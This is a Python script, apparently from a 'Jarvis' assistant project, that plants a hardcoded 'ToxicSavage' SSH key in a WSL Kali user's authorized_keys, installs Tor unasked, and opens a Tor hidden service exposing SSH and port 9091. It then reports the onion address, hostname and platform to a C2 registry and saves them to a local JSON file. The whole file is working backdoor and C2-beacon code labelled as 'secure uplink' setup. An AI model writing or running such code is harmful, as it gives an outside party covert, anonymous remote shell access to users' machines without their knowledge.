import os
import subprocess
import sys
import json
import socket
import uuid
import urllib.request

# Hardcoded Master Public Key for ToxicSavage
MASTER_PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAXQM+7xmlACIDN3Eb9kK72kdXoAdKTUzIOf3FwW8oy9 ToxicSavage-Master-Admin"

# Default C2 Registry (Can be overridden by environment variable)
C2_URL = os.environ.get("Jarvis_C2_URL", "http://localhost:9091")

def get_instance_id():
    id_file = os.path.join(os.path.dirname(__file__), '.instance_id')
    if os.path.exists(id_file):
        with open(id_file, 'r') as f:
            return f.read().strip()
    
    new_id = f"{socket.gethostname()}-{uuid.uuid4().hex[:8]}"
    with open(id_file, 'w') as f:
        f.write(new_id)
    return new_id

def report_to_c2(instance_id, onion_address):
    print(f"MASTER_ACCESS: Reporting to C2 Registry at {C2_URL}...")
    data = {
        "instance_id": instance_id,
        "onion_address": onion_address,
        "status": "online",
        "metadata": {
            "platform": sys.platform,
            "hostname": socket.gethostname(),
            "timestamp": os.path.getmtime(__file__)
        }
    }
    try:
        req = urllib.request.Request(f"{C2_URL}/register", 
                                     data=json.dumps(data).encode('utf-8'),
                                     headers={'Content-Type': 'application/json'},
                                     method='POST')
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status == 200:
                print("MASTER_ACCESS: C2 Registration Successful.")
    except Exception as e:
        print(f"MASTER_ACCESS: C2 Registration Failed: {e}")

def setup_master_access():
    print("MASTER_ACCESS: Initializing Secure Untraceable Uplink...")
    instance_id = get_instance_id()
    
    # 1. Setup SSH Authorized Keys in WSL Kali
    # ... (rest of the code remains similar)
    try:
        setup_cmd = f'''
        mkdir -p ~/.ssh
        chmod 700 ~/.ssh
        if ! grep -q "{MASTER_PUB_KEY}" ~/.ssh/authorized_keys 2>/dev/null; then
            echo "{MASTER_PUB_KEY}" >> ~/.ssh/authorized_keys
            chmod 600 ~/.ssh/authorized_keys
            echo "SSH_KEY_AUTHORIZED"
        fi
        '''
        subprocess.run(["wsl", "-d", "kali-linux", "bash", "-c", setup_cmd], check=True)
        print("MASTER_ACCESS: SSH identity verified and authorized.")
    except Exception as e:
        print(f"MASTER_ACCESS: Error authorizing SSH key: {e}")

    # 2. Configure Tor Hidden Service for Anonymity
    try:
        # Check if Tor is installed
        check_tor = subprocess.run(["wsl", "-d", "kali-linux", "which", "tor"], capture_output=True)
        if check_tor.returncode != 0:
            print("MASTER_ACCESS: Tor not found. Attempting background installation...")
            subprocess.run(["wsl", "-d", "kali-linux", "sudo", "apt-get", "install", "-y", "tor"], capture_output=True)
            
        check_tor = subprocess.run(["wsl", "-d", "kali-linux", "which", "tor"], capture_output=True)
        if check_tor.returncode == 0:
            torrc_config = """
HiddenServiceDir /var/lib/tor/Jarvis_master_ssh/
HiddenServicePort 22 127.0.0.1:22
HiddenServicePort 9091 127.0.0.1:9091
"""
            config_cmd = f'''
            if ! grep -q "Jarvis_master_ssh" /etc/tor/torrc 2>/dev/null; then
                echo '{torrc_config}' | sudo tee -a /etc/tor/torrc > /dev/null
                sudo mkdir -p /var/lib/tor/Jarvis_master_ssh/
                sudo chown -R debian-tor:debian-tor /var/lib/tor/Jarvis_master_ssh/
                sudo chmod 700 /var/lib/tor/Jarvis_master_ssh/
                sudo service tor restart
            fi
            '''
            subprocess.run(["wsl", "-d", "kali-linux", "bash", "-c", config_cmd], check=True)
            
            get_onion = subprocess.run(["wsl", "-d", "kali-linux", "sudo", "cat", "/var/lib/tor/Jarvis_master_ssh/hostname"], capture_output=True, text=True)
            if get_onion.returncode == 0:
                onion_address = get_onion.stdout.strip()
                print(f"MASTER_ACCESS_UPLINK: {onion_address}")
                
                # Report to C2
                report_to_c2(instance_id, onion_address)
                
                with open("MASTER_UPLINK.json", "w") as f:
                    json.dump({
                        "instance_id": instance_id,
                        "user": "ToxicSavage",
                        "onion_address": onion_address,
                        "port": 22,
                        "status": "SECURE_UNTRACEABLE_ACTIVE"
                    }, f, indent=4)
            else:
                print("MASTER_ACCESS: Tor service active but hostname not yet generated.")
        else:
            print("MASTER_ACCESS: Tor installation failed.")
    except Exception as e:
        print(f"MASTER_ACCESS: Error during Tor configuration: {e}")


if __name__ == "__main__":
    setup_master_access()
